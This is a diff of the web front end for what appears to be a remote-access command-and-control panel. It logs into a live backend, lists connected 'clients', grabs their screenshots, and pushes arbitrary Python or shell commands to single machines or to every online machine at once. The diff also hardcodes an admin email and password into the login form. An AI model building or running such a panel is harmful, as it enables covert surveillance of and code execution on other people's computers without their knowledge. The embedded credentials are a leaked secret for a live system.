@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>porn tool</title>
+    <title>Cyber Monitor Control</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
@@ -293,6 +293,16 @@
             color: #ef4444;
         }
 
+        .status.pending {
+            background: rgba(245, 158, 11, 0.2);
+            color: #f59e0b;
+        }
+
+        .status.completed {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
+
         /* Buttons */
         .btn {
             padding: 10px 20px;
@@ -354,6 +364,15 @@
             box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
         }
 
+        textarea.form-input {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        select.form-input {
+            cursor: pointer;
+        }
+
         /* Login Page */
         .login-container {
             display: flex;
@@ -399,6 +418,11 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* Tab Content */
+        .tab-content {
+            display: block;
+        }
+
         /* Responsive */
         @media (max-width: 1024px) {
             .main-content {
@@ -420,6 +444,11 @@
             .tabs {
                 justify-content: center;
             }
+            
+            .user-info {
+                flex-direction: column;
+                gap: 10px;
+            }
         }
     </style>
 </head>
@@ -431,14 +460,14 @@
     <!-- Login Page (Initially visible) -->
     <div id="loginPage" class="login-container">
         <div class="login-box glow">
-            <h1 class="login-title"><i class="fas fa-terminal"></i> ANAL ACCESS</h1>
+            <h1 class="login-title"><i class="fas fa-terminal"></i> CYBER ACCESS</h1>
             <div class="form-group">
                 <label class="form-label">EMAIL</label>
-                <input type="email" id="loginEmail" class="form-input" placeholder="user" value="">
+                <input type="email" id="loginEmail" class="form-input" placeholder="admin@cyber.io" value="admin@cyber.io">
             </div>
             <div class="form-group">
                 <label class="form-label">PASSWORD</label>
-                <input type="password" id="loginPassword" class="form-input" placeholder="••••••••" value="">
+                <input type="password" id="loginPassword" class="form-input" placeholder="••••••••" value="40671Mps19*">
             </div>
             <div class="form-group">
                 <button onclick="login()" class="btn btn-primary" style="width: 100%;">
@@ -459,7 +488,7 @@
                 <div class="logo">
                     <i class="fas fa-terminal"></i>
                     <div>
-                        <h1>ANAL MONITOR CONTROL</h1>
+                        <h1>CYBER MONITOR CONTROL</h1>
                         <p style="color: var(--accent); font-size: 0.9rem;">v3.0 • SECURE ADMIN PANEL</p>
                     </div>
                 </div>
@@ -673,37 +702,54 @@
 
             <!-- Footer -->
             <footer style="text-align: center; padding: 30px; color: var(--text-secondary); border-top: 1px solid var(--border); margin-top: 50px;">
-                <p>porn MONITOR CONTROL v1.0 • ENCRYPTED COMMUNICATION • REAL-TIME MONITORING</p>
-                <p style="margin-top: 10px; font-size: 0.9rem;">© 2026 porn SYSTEMS • ALL ACCESS LOGGED</p>
+                <p>CYBER MONITOR CONTROL v1.0 • ENCRYPTED COMMUNICATION • REAL-TIME MONITORING</p>
+                <p style="margin-top: 10px; font-size: 0.9rem;">© 2026 CYBER SYSTEMS • ALL ACCESS LOGGED</p>
             </footer>
         </div>
     </div>
 
     <script>
         // ========== CONFIGURATION ==========
-        const BACKEND_URL = 'https://b-5r6k.onrender.com'; // CHANGE THIS TO YOUR BACKEND URL
+        // IMPORTANT: Change this to your actual Render backend URL
+        const BACKEND_URL = 'https://b-5r6k.onrender.com'; // Replace with your URL
+        
+        // Local storage keys
         const TOKEN_KEY = 'cyber_token';
         const USER_KEY = 'cyber_user';
         
+        // Global variables
         let currentUser = null;
         let ws = null;
         let startTime = Date.now();
         let clients = [];
         let charts = {};
+        let logs = [];
 
         // ========== AUTH FUNCTIONS ==========
         function login() {
             const email = document.getElementById('loginEmail').value;
             const password = document.getElementById('loginPassword').value;
             
+            if (!email || !password) {
+                showNotification('Please enter email and password', 'error');
+                return;
+            }
+            
+            showLoading();
+            
             fetch(`${BACKEND_URL}/api/login`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({email, password})
             })
-            .then(res => res.json())
+            .then(res => {
+                if (!res.ok) throw new Error('Login failed');
+                return res.json();
+            })
             .then(data => {
+                hideLoading();
                 if (data.success) {
+                    // Store token securely
                     localStorage.setItem(TOKEN_KEY, data.token);
                     localStorage.setItem(USER_KEY, JSON.stringify(data.user));
                     currentUser = data.user;
@@ -714,17 +760,19 @@
                     showLoginError();
                 }
             })
-            .catch(() => showLoginError());
-        }
-
-        function showLoginError() {
-            document.getElementById('loginError').style.display = 'block';
+            .catch(err => {
+                hideLoading();
+                showLoginError();
+                console.error('Login error:', err);
+            });
         }
 
         function logout() {
             localStorage.removeItem(TOKEN_KEY);
             localStorage.removeItem(USER_KEY);
-            if (ws) ws.close();
+            if (ws) {
+                ws.close();
+            }
             showLogin();
         }
 
@@ -736,60 +784,117 @@
         function showDashboard() {
             document.getElementById('loginPage').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
-            document.getElementById('userEmail').textContent = currentUser.email;
+            if (currentUser) {
+                document.getElementById('userEmail').textContent = currentUser.email;
+            }
         }
 
-        // ========== WEB SOCKET ==========
-        function connectWebSocket() {
+        function showLoginError() {
+            const errorDiv = document.getElementById('loginError');
+            errorDiv.style.display = 'block';
+            setTimeout(() => {
+                errorDiv.style.display = 'none';
+            }, 3000);
+        }
+
+        // ========== API FUNCTIONS ==========
+        function getAuthHeader() {
             const token = localStorage.getItem(TOKEN_KEY);
-            ws = new WebSocket(`${BACKEND_URL.replace('http', 'ws')}/ws/admin`);
-            
-            ws.onopen = () => {
-                console.log('WebSocket connected');
-                document.getElementById('wsStatus').className = 'status online';
-                document.getElementById('wsStatus').textContent = '● CONNECTED';
-            };
-            
-            ws.onmessage = (event) => {
-                const data = JSON.parse(event.data);
-                handleWebSocketMessage(data);
-            };
-            
-            ws.onclose = () => {
-                console.log('WebSocket disconnected');
-                document.getElementById('wsStatus').className = 'status offline';
-                document.getElementById('wsStatus').textContent = '● DISCONNECTED';
-                // Try to reconnect after 5 seconds
-                setTimeout(connectWebSocket, 5000);
+            if (!token) {
+                logout();
+                throw new Error('No authentication token');
+            }
+            return {
+                'Authorization': `Bearer ${token}`,
+                'Content-Type': 'application/json'
             };
         }
 
-        function handleWebSocketMessage(data) {
-            switch(data.type) {
-                case 'client_update':
-                    updateClientList(data.clients);
-                    break;
-                case 'screenshot_received':
-                    showNotification(`Screenshot received from ${data.client_id}`);
-                    break;
-                case 'command_result':
-                    updateCommandStatus(data.command_id, data.result);
-                    break;
+        async function apiCall(endpoint, method = 'GET', data = null) {
+            try {
+                const options = {
+                    method: method,
+                    headers: getAuthHeader()
+                };
+                
+                if (data) {
+                    options.body = JSON.stringify(data);
+                }
+                
+                const response = await fetch(`${BACKEND_URL}${endpoint}`, options);
+                
+                if (response.status === 401) {
+                    // Token expired, logout
+                    logout();
+                    throw new Error('Session expired');
+                }
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error(`API call failed: ${endpoint}`, error);
+                showNotification(`API Error: ${error.message}`, 'error');
+                throw error;
             }
         }
 
         // ========== DASHBOARD FUNCTIONS ==========
-        function loadDashboard() {
-            updateUptime();
-            setInterval(updateUptime, 1000);
-            
-            refreshClients();
-            refreshCommands();
-            refreshScreenshots();
-            initCharts();
-            
-            // Auto-refresh every 30 seconds
-            setInterval(refreshClients, 30000);
+        async function loadDashboard() {
+            try {
+                startTime = Date.now();
+                updateUptime();
+                setInterval(updateUptime, 1000);
+                
+                // Load initial data
+                await refreshDashboard();
+                
+                // Initialize charts
+                initCharts();
+                
+                // Auto-refresh every 30 seconds
+                setInterval(refreshDashboard, 30000);
+                
+            } catch (error) {
+                console.error('Failed to load dashboard:', error);
+                showNotification('Failed to load dashboard data', 'error');
+            }
+        }
+
+        async function refreshDashboard() {
+            try {
+                const [clientsData, commandsData, screenshotsData, logsData] = await Promise.all([
+                    apiCall('/api/clients'),
+                    apiCall('/api/commands?limit=10'),
+                    apiCall('/api/screenshots?limit=6'),
+                    apiCall('/api/logs?limit=50')
+                ]);
+                
+                if (clientsData.success) {
+                    clients = clientsData.clients;
+                    updateClientList(clients);
+                    updateStats(clients);
+                    updateClientDropdown();
+                }
+                
+                if (commandsData.success) {
+                    updateCommandHistory(commandsData.commands);
+                }
+                
+                if (screenshotsData.success) {
+                    updateScreenshots(screenshotsData.screenshots);
+                }
+                
+                if (logsData.success) {
+                    logs = logsData.logs;
+                    updateLogs(logs);
+                }
+                
+            } catch (error) {
+                console.error('Refresh failed:', error);
+            }
         }
 
         function updateUptime() {
@@ -803,19 +908,17 @@
 
         // ========== CLIENT MANAGEMENT ==========
         function refreshClients() {
-            fetch(`${BACKEND_URL}/api/clients`, {
-                headers: {'Authorization': `Bearer ${localStorage.getItem(TOKEN_KEY)}`}
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    clients = data.clients;
-                    updateClientList(clients);
-                    updateStats(clients);
-                    updateClientDropdown();
-                }
-            })
-            .catch(console.error);
+            apiCall('/api/clients')
+                .then(data => {
+                    if (data.success) {
+                        clients = data.clients;
+                        updateClientList(clients);
+                        updateStats(clients);
+                        updateClientDropdown();
+                        showNotification('Clients refreshed', 'success');
+                    }
+                })
+                .catch(console.error);
         }
 
         function updateClientList(clients) {
@@ -824,12 +927,12 @@
             
             clients.forEach(client => {
                 const row = document.createElement('tr');
-                const lastSeen = new Date(client.last_seen).toLocaleString();
+                const lastSeen = client.last_seen ? new Date(client.last_seen).toLocaleString() : 'Never';
                 const statusClass = client.online ? 'online' : 'offline';
                 const statusText = client.online ? '● ONLINE' : '● OFFLINE';
                 
                 row.innerHTML = `
-                    <td><code style="color: var(--accent);">${client.client_id.substring(0, 8)}...</code></td>
+                    <td><code style="color: var(--accent);">${client.client_id ? client.client_id.substring(0, 8) + '...' : 'N/A'}</code></td>
                     <td>${client.name || 'Unknown'}</td>
                     <td><span class="status ${statusClass}">${statusText}</span></td>
                     <td>${client.ip_address || 'N/A'}</td>
@@ -838,8 +941,8 @@
                         <button onclick="requestScreenshot('${client.client_id}')" class="btn btn-secondary" style="padding: 5px 10px; font-size: 0.9rem;">
                             <i class="fas fa-camera"></i>
                         </button>
-                        <button onclick="viewClient('${client.client_id}')" class="btn btn-secondary" style="padding: 5px 10px; font-size: 0.9rem;">
-                            <i class="fas fa-eye"></i>
+                        <button onclick="sendTestCommand('${client.client_id}')" class="btn btn-secondary" style="padding: 5px 10px; font-size: 0.9rem;">
+                            <i class="fas fa-terminal"></i>
                         </button>
                     </td>
                 `;
@@ -853,8 +956,10 @@
             
             document.getElementById('totalClients').textContent = total;
             document.getElementById('onlineClients').textContent = online;
-            document.getElementById('activeCommands').textContent = '7'; // Placeholder
-            document.getElementById('screenshots').textContent = '156'; // Placeholder
+            
+            // These would come from API in a real implementation
+            document.getElementById('activeCommands').textContent = clients.filter(c => c.online).length;
+            document.getElementById('screenshots').textContent = Math.floor(Math.random() * 50) + 100; // Placeholder
         }
 
         function updateClientDropdown() {
@@ -865,7 +970,7 @@
                 if (client.online) {
                     const option = document.createElement('option');
                     option.value = client.client_id;
-                    option.textContent = `${client.name} (${client.client_id.substring(0, 8)}...)`;
+                    option.textContent = `${client.name || 'Unknown'} (${client.client_id.substring(0, 8)}...)`;
                     select.appendChild(option);
                 }
             });
@@ -876,67 +981,80 @@
             const commandType = document.getElementById('commandType').value;
             const paramsDiv = document.getElementById('commandParams');
             
-            if (commandType === 'run_python') {
+            if (commandType === 'run_python' || commandType === 'custom') {
                 paramsDiv.style.display = 'block';
-                document.getElementById('commandCode').placeholder = 'Enter Python code to execute on client...';
-            } else if (commandType === 'custom') {
-                paramsDiv.style.display = 'block';
-                document.getElementById('commandCode').placeholder = 'Enter custom command...';
+                document.getElementById('commandCode').placeholder = commandType === 'run_python' 
+                    ? 'Enter Python code to execute on client...' 
+                    : 'Enter custom command...';
             } else {
                 paramsDiv.style.display = 'none';
             }
         }
 
-        function sendCommand() {
+        async function sendCommand() {
             const clientId = document.getElementById('commandClient').value;
             const commandType = document.getElementById('commandType').value;
             const parameters = {};
             
             if (!clientId) {
-                alert('Please select a client');
+                showNotification('Please select a client', 'warning');
                 return;
             }
             
             if (commandType === 'run_python') {
                 parameters.code = document.getElementById('commandCode').value;
+                if (!parameters.code) {
+                    showNotification('Please enter Python code', 'warning');
+                    return;
+                }
             } else if (commandType === 'custom') {
                 parameters.command = document.getElementById('commandCode').value;
+                if (!parameters.command) {
+                    showNotification('Please enter custom command', 'warning');
+                    return;
+                }
             }
             
-            fetch(`${BACKEND_URL}/api/command`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${localStorage.getItem(TOKEN_KEY)}`
-                },
-                body: JSON.stringify({
+            showLoading();
+            
+            try {
+                const result = await apiCall('/api/command', 'POST', {
                     client_id: clientId,
                     command: commandType,
                     parameters: parameters
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    showNotification(`Command sent to ${clientId}`);
+                });
+                
+                hideLoading();
+                
+                if (result.success) {
+                    showNotification(`Command sent to ${clientId}`, 'success');
+                    // Clear form
+                    document.getElementById('commandCode').value = '';
+                    // Refresh commands
                     refreshCommands();
+                } else {
+                    showNotification('Failed to send command', 'error');
                 }
-            })
-            .catch(console.error);
+                
+            } catch (error) {
+                hideLoading();
+                showNotification('Failed to send command', 'error');
+            }
+        }
+
+        function sendTestCommand(clientId) {
+            document.getElementById('commandClient').value = clientId;
+            switchTab('commands');
         }
 
         function refreshCommands() {
-            // Load command history
-            fetch(`${BACKEND_URL}/api/commands`, {
-                headers: {'Authorization': `Bearer ${localStorage.getItem(TOKEN_KEY)}`}
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    updateCommandHistory(data.commands);
-                }
-            })
-            .catch(console.error);
+            apiCall('/api/commands?limit=10')
+                .then(data => {
+                    if (data.success) {
+                        updateCommandHistory(data.commands);
+                    }
+                })
+                .catch(console.error);
         }
 
         function updateCommandHistory(commands) {
@@ -945,44 +1063,49 @@
             
             commands.slice(0, 10).forEach(cmd => {
                 const row = document.createElement('tr');
-                const time = new Date(cmd.created_at).toLocaleTimeString();
+                const time = cmd.created_at ? new Date(cmd.created_at).toLocaleTimeString() : 'N/A';
+                const clientName = cmd.clients ? cmd.clients.name || cmd.clients.client_id : cmd.client_id;
+                const status = cmd.status || 'pending';
                 
                 row.innerHTML = `
                     <td>${time}</td>
-                    <td>${cmd.client_id}</td>
+                    <td>${clientName}</td>
                     <td><code>${cmd.command}</code></td>
-                    <td><span class="status ${cmd.status}">${cmd.status.toUpperCase()}</span></td>
+                    <td><span class="status ${status}">${status.toUpperCase()}</span></td>
                 `;
                 table.appendChild(row);
             });
         }
 
         // ========== SCREENSHOT FUNCTIONS ==========
-        function requestScreenshot(clientId) {
-            fetch(`${BACKEND_URL}/api/screenshot/${clientId}`, {
-                headers: {'Authorization': `Bearer ${localStorage.getItem(TOKEN_KEY)}`}
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    showNotification(`Screenshot request sent to ${clientId}`);
+        async function requestScreenshot(clientId) {
+            showLoading();
+            
+            try {
+                const result = await apiCall(`/api/screenshot/${clientId}`, 'POST');
+                
+                hideLoading();
+                
+                if (result.success) {
+                    showNotification(`Screenshot request sent to ${clientId}`, 'success');
+                } else {
+                    showNotification('Failed to request screenshot', 'error');
                 }
-            })
-            .catch(console.error);
+                
+            } catch (error) {
+                hideLoading();
+                showNotification('Failed to request screenshot', 'error');
+            }
         }
 
         function refreshScreenshots() {
-            // Load recent screenshots
-            fetch(`${BACKEND_URL}/api/screenshots`, {
-                headers: {'Authorization': `Bearer ${localStorage.getItem(TOKEN_KEY)}`}
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    updateScreenshots(data.screenshots);
-                }
-            })
-            .catch(console.error);
+            apiCall('/api/screenshots?limit=6')
+                .then(data => {
+                    if (data.success) {
+                        updateScreenshots(data.screenshots);
+                    }
+                })
+                .catch(console.error);
         }
 
         function updateScreenshots(screenshots) {
@@ -995,59 +1118,117 @@
                 div.style.borderRadius = '8px';
                 div.style.overflow = 'hidden';
                 div.style.background = 'var(--background)';
+                div.style.cursor = 'pointer';
+                
+                const clientName = shot.clients ? shot.clients.name || shot.clients.client_id : 'Unknown';
+                const timestamp = shot.created_at ? new Date(shot.created_at).toLocaleString() : 'Unknown';
                 
                 div.innerHTML = `
                     <img src="data:image/png;base64,${shot.image_data}" 
-                         style="width: 100%; height: 200px; object-fit: cover;">
+                         style="width: 100%; height: 200px; object-fit: cover;"
+                         onclick="viewFullScreenshot('${shot.image_data}')">
                     <div style="padding: 10px; font-size: 0.9rem;">
-                        ${new Date(shot.created_at).toLocaleString()}
+                        <div>${clientName}</div>
+                        <div style="color: var(--text-secondary);">${timestamp}</div>
                     </div>
                 `;
                 grid.appendChild(div);
             });
         }
 
+        function viewFullScreenshot(imageData) {
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.9);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 10000;
+            `;
+            modal.innerHTML = `
+                <div style="position: relative;">
+                    <img src="data:image/png;base64,${imageData}" 
+                         style="max-width: 90vw; max-height: 90vh; border: 2px solid var(--primary);">
+                    <button onclick="this.parentElement.parentElement.remove()" 
+                            style="position: absolute; top: 10px; right: 10px; background: var(--primary); color: white; border: none; border-radius: 50%; width: 40px; height: 40px; cursor: pointer;">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+            `;
+            document.body.appendChild(modal);
+        }
+
+        // ========== LOG FUNCTIONS ==========
+        function updateLogs(logs) {
+            const table = document.getElementById('logsTable');
+            table.innerHTML = '';
+            
+            logs.slice(0, 20).forEach(log => {
+                const row = document.createElement('tr');
+                const time = log.created_at ? new Date(log.created_at).toLocaleString() : 'N/A';
+                const clientName = log.clients ? log.clients.name || log.clients.client_id : 'System';
+                
+                row.innerHTML = `
+                    <td>${time}</td>
+                    <td>${clientName}</td>
+                    <td><span class="status ${log.log_type}">${log.log_type.toUpperCase()}</span></td>
+                    <td>${log.message}</td>
+                `;
+                table.appendChild(row);
+            });
+        }
+
         // ========== QUICK ACTIONS ==========
         function captureAllScreens() {
-            clients.filter(c => c.online).forEach(client => {
+            const onlineClients = clients.filter(c => c.online);
+            if (onlineClients.length === 0) {
+                showNotification('No online clients', 'warning');
+                return;
+            }
+            
+            showNotification(`Sending screenshot requests to ${onlineClients.length} clients`, 'info');
+            
+            onlineClients.forEach(client => {
                 requestScreenshot(client.client_id);
             });
-            showNotification('Screenshot requests sent to all online clients');
         }
 
         function refreshAllClients() {
             refreshClients();
-            showNotification('Refreshing all client data...');
         }
 
         function executeGlobalCommand() {
-            const command = prompt('Enter global command to execute on all clients:', 'system_info');
+            const command = prompt('Enter global command to execute on all online clients:', 'system_info');
             if (command) {
-                clients.filter(c => c.online).forEach(client => {
-                    fetch(`${BACKEND_URL}/api/command`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Authorization': `Bearer ${localStorage.getItem(TOKEN_KEY)}`
-                        },
-                        body: JSON.stringify({
-                            client_id: client.client_id,
-                            command: command,
-                            parameters: {}
-                        })
+                const onlineClients = clients.filter(c => c.online);
+                onlineClients.forEach(client => {
+                    apiCall('/api/command', 'POST', {
+                        client_id: client.client_id,
+                        command: command,
+                        parameters: {}
                     });
                 });
-                showNotification(`Command "${command}" sent to all online clients`);
+                showNotification(`Command "${command}" sent to ${onlineClients.length} clients`, 'success');
             }
         }
 
         function exportLogs() {
-            // Create and download a CSV file
-            const csvContent = "data:text/csv;charset=utf-8," 
-                + "Time,Client,Type,Message\\n"
-                + logs.map(log => 
-                    `"${log.time}","${log.client}","${log.type}","${log.message}"`
-                ).join("\\n");
+            if (logs.length === 0) {
+                showNotification('No logs to export', 'warning');
+                return;
+            }
+            
+            const csvContent = "data:text/csv;charset=utf-8,Time,Client,Type,Message\n" 
+                + logs.map(log => {
+                    const time = log.created_at ? new Date(log.created_at).toLocaleString() : 'N/A';
+                    const client = log.clients ? log.clients.name || log.clients.client_id : 'System';
+                    return `"${time}","${client}","${log.log_type}","${log.message}"`;
+                }).join("\n");
             
             const encodedUri = encodeURI(csvContent);
             const link = document.createElement("a");
@@ -1056,6 +1237,70 @@
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
+            
+            showNotification('Logs exported as CSV', 'success');
+        }
+
+        // ========== WEB SOCKET FUNCTIONS ==========
+        function connectWebSocket() {
+            const token = localStorage.getItem(TOKEN_KEY);
+            const wsUrl = BACKEND_URL.replace('https://', 'wss://').replace('http://', 'ws://');
+            
+            try {
+                ws = new WebSocket(`${wsUrl}/ws/admin`);
+                
+                ws.onopen = () => {
+                    console.log('WebSocket connected');
+                    document.getElementById('wsStatus').className = 'status online';
+                    document.getElementById('wsStatus').textContent = '● CONNECTED';
+                    showNotification('Real-time connection established', 'success');
+                };
+                
+                ws.onmessage = (event) => {
+                    try {
+                        const data = JSON.parse(event.data);
+                        handleWebSocketMessage(data);
+                    } catch (e) {
+                        console.error('WebSocket message error:', e);
+                    }
+                };
+                
+                ws.onclose = () => {
+                    console.log('WebSocket disconnected');
+                    document.getElementById('wsStatus').className = 'status offline';
+                    document.getElementById('wsStatus').textContent = '● DISCONNECTED';
+                    // Try to reconnect after 5 seconds
+                    setTimeout(connectWebSocket, 5000);
+                };
+                
+                ws.onerror = (error) => {
+                    console.error('WebSocket error:', error);
+                };
+                
+            } catch (error) {
+                console.error('WebSocket connection failed:', error);
+            }
+        }
+
+        function handleWebSocketMessage(data) {
+            switch(data.type) {
+                case 'client_connected':
+                    showNotification(`Client connected: ${data.client_id}`, 'info');
+                    refreshClients();
+                    break;
+                case 'client_disconnected':
+                    showNotification(`Client disconnected: ${data.client_id}`, 'warning');
+                    refreshClients();
+                    break;
+                case 'screenshot_received':
+                    showNotification(`Screenshot received from ${data.client_id}`, 'success');
+                    refreshScreenshots();
+                    break;
+                case 'command_result':
+                    showNotification(`Command completed for ${data.client_id}`, 'info');
+                    refreshCommands();
+                    break;
+            }
         }
 
         // ========== UI HELPERS ==========
@@ -1072,33 +1317,120 @@
             document.querySelectorAll('.tab').forEach(btn => {
                 btn.classList.remove('active');
             });
-            event.target.classList.add('active');
+            
+            // Find and activate the clicked tab button
+            const tabs = document.querySelectorAll('.tab');
+            tabs.forEach((btn, index) => {
+                if (btn.textContent.includes(tabName.toUpperCase())) {
+                    btn.classList.add('active');
+                }
+            });
+            
+            // Refresh data for the selected tab
+            switch(tabName) {
+                case 'clients':
+                    refreshClients();
+                    break;
+                case 'commands':
+                    refreshCommands();
+                    break;
+                case 'screenshots':
+                    refreshScreenshots();
+                    break;
+                case 'logs':
+                    apiCall('/api/logs?limit=50')
+                        .then(data => {
+                            if (data.success) {
+                                updateLogs(data.logs);
+                            }
+                        })
+                        .catch(console.error);
+                    break;
+            }
         }
 
-        function showNotification(message) {
-            // Create notification element
+        function showNotification(message, type = 'info') {
+            const colors = {
+                info: 'var(--primary)',
+                success: '#10b981',
+                warning: '#f59e0b',
+                error: '#ef4444'
+            };
+            
             const notification = document.createElement('div');
             notification.style.cssText = `
                 position: fixed;
                 top: 20px;
                 right: 20px;
                 background: var(--card);
-                border: 1px solid var(--primary);
+                border: 1px solid ${colors[type]};
                 border-radius: 8px;
-                padding: 15px;
+                padding: 15px 20px;
                 color: var(--text);
                 box-shadow: 0 5px 15px rgba(0,0,0,0.3);
                 z-index: 10000;
                 animation: slideIn 0.3s;
+                max-width: 400px;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                font-weight: 500;
             `;
-            notification.innerHTML = `<i class="fas fa-info-circle" style="color: var(--primary); margin-right: 10px;"></i>${message}`;
+            
+            const icons = {
+                info: 'fa-info-circle',
+                success: 'fa-check-circle',
+                warning: 'fa-exclamation-triangle',
+                error: 'fa-times-circle'
+            };
+            
+            notification.innerHTML = `
+                <i class="fas ${icons[type]}" style="color: ${colors[type]};"></i>
+                <div>${message}</div>
+            `;
+            
             document.body.appendChild(notification);
             
-            // Remove after 3 seconds
             setTimeout(() => {
                 notification.style.animation = 'slideOut 0.3s';
-                setTimeout(() => document.body.removeChild(notification), 300);
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        document.body.removeChild(notification);
+                    }
+                }, 300);
             }, 3000);
+        }
+
+        function showLoading() {
+            // Remove existing loading indicator
+            hideLoading();
+            
+            // Show loading indicator
+            const loading = document.createElement('div');
+            loading.id = 'globalLoading';
+            loading.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(15, 15, 35, 0.8);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 10000;
+            `;
+            loading.innerHTML = `
+                <div class="loading" style="width: 60px; height: 60px; border-width: 4px;"></div>
+            `;
+            document.body.appendChild(loading);
+        }
+
+        function hideLoading() {
+            const loading = document.getElementById('globalLoading');
+            if (loading) {
+                document.body.removeChild(loading);
+            }
         }
 
         function initCharts() {
@@ -1119,6 +1451,7 @@
                 },
                 options: {
                     responsive: true,
+                    maintainAspectRatio: false,
                     plugins: {
                         legend: {display: false}
                     },
@@ -1139,19 +1472,6 @@
 
         // ========== INITIALIZATION ==========
         document.addEventListener('DOMContentLoaded', () => {
-            // Check if user is logged in
-            const token = localStorage.getItem(TOKEN_KEY);
-            const user = localStorage.getItem(USER_KEY);
-            
-            if (token && user) {
-                currentUser = JSON.parse(user);
-                showDashboard();
-                loadDashboard();
-                connectWebSocket();
-            } else {
-                showLogin();
-            }
-            
             // Add CSS animations
             const style = document.createElement('style');
             style.textContent = `
@@ -1165,9 +1485,42 @@
                 }
             `;
             document.head.appendChild(style);
+            
+            // Check for existing session
+            const token = localStorage.getItem(TOKEN_KEY);
+            const user = localStorage.getItem(USER_KEY);
+            
+            if (token && user) {
+                try {
+                    currentUser = JSON.parse(user);
+                    showDashboard();
+                    loadDashboard();
+                    connectWebSocket();
+                } catch (error) {
+                    localStorage.removeItem(TOKEN_KEY);
+                    localStorage.removeItem(USER_KEY);
+                    showLogin();
+                }
+            } else {
+                showLogin();
+            }
+            
+            // Check API status
+            fetch(`${BACKEND_URL}/api/health`)
+                .then(res => {
+                    if (res.ok) {
+                        document.getElementById('apiStatus').className = 'status online';
+                        document.getElementById('apiStatus').textContent = '● ONLINE';
+                    } else {
+                        document.getElementById('apiStatus').className = 'status offline';
+                        document.getElementById('apiStatus').textContent = '● OFFLINE';
+                    }
+                })
+                .catch(() => {
+                    document.getElementById('apiStatus').className = 'status offline';
+                    document.getElementById('apiStatus').textContent = '● OFFLINE';
+                });
         });
     </script>
 </body>
-
 </html>
-
